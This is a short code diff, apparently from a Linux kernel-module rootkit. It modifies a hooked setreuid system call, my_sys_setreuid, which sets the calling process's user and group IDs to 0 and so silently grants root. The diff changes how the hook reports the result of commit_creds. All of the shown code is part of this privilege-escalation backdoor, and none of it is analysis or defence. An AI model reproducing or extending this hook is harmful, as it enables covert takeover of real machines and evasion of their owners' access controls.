@@ -48,6 +48,7 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
 {
     struct user_namespace *ns = current_user_ns();
     struct cred *new;
+    int result;
 
     kuid_t kuid;
     kgid_t kgid;
@@ -65,6 +66,8 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
             current->sgid = 0;
             current->fsuid = 0;
             current->fsgid = 0;
+
+            result = 0;
         #elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30) && LINUX_VERSION_CODE <= KERNEL_VERSION(3, 4, 0)
             new = prepare_creds();
  
@@ -79,7 +82,7 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
                 new->fsuid = 0;
                 new->fsgid = 0;
 
-                commit_creds(new);
+                result = commit_creds(new);
             }
 
             else
@@ -109,7 +112,7 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
                 new->fsuid = kuid;
                 new->fsgid = kgid;
 
-                commit_creds(new);
+                result = commit_creds(new);
             }
 
             else
@@ -121,7 +124,7 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
         
         printk(KERN_DEBUG "Always remember... With great power comes great responsibility!\n");
 
-        return orig_sys_setreuid(0, 0);
+        return result;
     }
 
     return orig_sys_setreuid(ruid, euid);
